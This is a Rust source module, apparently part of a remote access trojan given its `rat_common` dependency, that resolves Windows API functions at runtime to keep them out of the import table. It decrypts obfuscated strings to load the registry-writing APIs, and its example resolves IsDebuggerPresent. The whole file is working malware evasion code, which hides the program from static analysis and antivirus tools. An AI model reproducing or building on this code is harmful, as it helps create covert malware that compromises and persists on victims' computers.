//! Dynamic API resolution — resolve Win32 functions at runtime via
//! `LoadLibraryA` / `GetProcAddress` to avoid static import table entries.
//!
//! This module is only compiled on Windows.

#![cfg(target_os = "windows")]

use std::ffi::CString;
use windows_sys::Win32::Foundation::HMODULE;
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};

/// Dynamically load a DLL and resolve a function pointer.
///
/// # Safety
/// The caller must ensure:
/// - `dll` and `func` are valid C strings.
/// - The returned pointer is cast to the correct function signature.
pub unsafe fn resolve(dll: &str, func: &str) -> Option<*const ()> {
    let dll_c = CString::new(dll).ok()?;
    let func_c = CString::new(func).ok()?;

    let module: HMODULE = LoadLibraryA(dll_c.as_ptr() as *const u8);
    if module == 0 {
        return None;
    }

    let addr = GetProcAddress(module, func_c.as_ptr() as *const u8);
    addr.map(|f| f as *const ())
}

/// Convenience macro to resolve a Win32 API and cast it to a typed fn pointer.
///
/// # Example
/// ```ignore
/// let fn_ptr: Option<unsafe extern "system" fn() -> i32> =
///     resolve_api!("kernel32.dll", "IsDebuggerPresent");
/// ```
#[macro_export]
macro_rules! resolve_api {
    ($dll:expr, $func:expr, $ty:ty) => {{
        unsafe { $crate::dynapi::resolve($dll, $func).map(|p| std::mem::transmute::<_, $ty>(p)) }
    }};
}

// ---------------------------------------------------------------------------
// Pre-resolved API table for registry operations
// ---------------------------------------------------------------------------

/// Registry API function pointers resolved at runtime.
pub struct RegistryApis {
    pub reg_open_key_ex_a: unsafe extern "system" fn(
        usize, // HKEY
        *const u8,
        u32,
        u32,
        *mut usize,
    ) -> i32,
    pub reg_set_value_ex_a: unsafe extern "system" fn(
        usize,
        *const u8,
        u32,
        u32,
        *const u8,
        u32,
    ) -> i32,
    pub reg_close_key: unsafe extern "system" fn(usize) -> i32,
}

impl RegistryApis {
    /// Resolve all registry APIs from advapi32.dll.
    pub fn resolve() -> Option<Self> {
        unsafe {
            // Decrypt DLL name at runtime
            let dll_bytes = rat_common::obfuscate!("advapi32.dll");
            let dll = String::from_utf8(dll_bytes).ok()?;

            let open_bytes = rat_common::obfuscate!("RegOpenKeyExA");
            let open_name = String::from_utf8(open_bytes).ok()?;

            let set_bytes = rat_common::obfuscate!("RegSetValueExA");
            let set_name = String::from_utf8(set_bytes).ok()?;

            let close_bytes = rat_common::obfuscate!("RegCloseKey");
            let close_name = String::from_utf8(close_bytes).ok()?;

            let open = super::dynapi::resolve(&dll, &open_name)?;
            let set = super::dynapi::resolve(&dll, &set_name)?;
            let close = super::dynapi::resolve(&dll, &close_name)?;

            Some(Self {
                reg_open_key_ex_a: std::mem::transmute(open),
                reg_set_value_ex_a: std::mem::transmute(set),
                reg_close_key: std::mem::transmute(close),
            })
        }
    }
}
